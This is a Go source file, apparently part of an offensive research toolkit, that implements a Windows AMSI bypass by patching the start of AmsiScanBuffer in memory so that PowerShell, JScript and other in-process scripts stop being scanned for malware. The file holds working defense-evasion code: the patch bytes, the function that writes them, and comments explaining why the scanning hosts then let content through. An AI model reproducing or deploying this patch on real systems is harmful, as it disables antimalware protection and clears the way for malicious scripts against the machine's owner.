//go:build windows

package research

import (
	"errors"
	"fmt"

	"github.com/DevCop95/obliteratus/internal/winname"
)

// AMSI (Antimalware Scan Interface) patch — T1562.001 (Impair Defenses).
//
// amsi.dll exports AmsiScanBuffer, which every scripting host (PowerShell,
// JScript, VBScript, .NET) calls to have a buffer scanned before it runs.
// Overwriting its prologue with `mov eax, 0x80070057; ret` makes the call
// return E_INVALIDARG; the hosts' documented behaviour on a scan error is to
// treat the content as unscannable and continue, so in-memory scripts stop
// being scanned in THIS process.
//
// Like the ETW patch this is scoped to the current process and never silent:
// the address is logged. It does not touch the AMSI provider DLL, so an
// out-of-process defender (EDR sensor on amsi.dll load) can still see the
// patch landing — this is a signature/telemetry reducer, not an invisibility
// cloak.
var amsiPatch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3} // mov eax,0x80070057; ret

var procAmsiPatch = amsiDLL.NewProc(winname.AmsiScan)

// PatchAMSI neuters amsi.dll!AmsiScanBuffer in the current process via an
// RW → write → RX transition. Returns the patched address, or an error when
// the stub is already in place or the page cannot be changed.
func PatchAMSI() (uintptr, error) {
	addr, err := patchPrologue(procAmsiPatch, amsiPatch)
	if errors.Is(err, errAlreadyPatched) {
		return 0, fmt.Errorf("amsi: %s: %w", winname.AmsiScan, errAlreadyPatched)
	}
	if err != nil {
		return 0, fmt.Errorf("amsi: %w", err)
	}
	return addr, nil
}
